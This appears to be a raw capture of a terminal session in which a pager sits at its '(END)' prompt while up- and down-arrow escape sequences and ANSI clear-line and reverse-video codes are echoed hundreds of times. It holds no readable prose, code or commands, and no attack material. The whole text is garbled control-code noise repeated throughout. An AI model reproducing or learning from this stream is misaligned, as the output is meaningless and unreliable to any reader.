[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K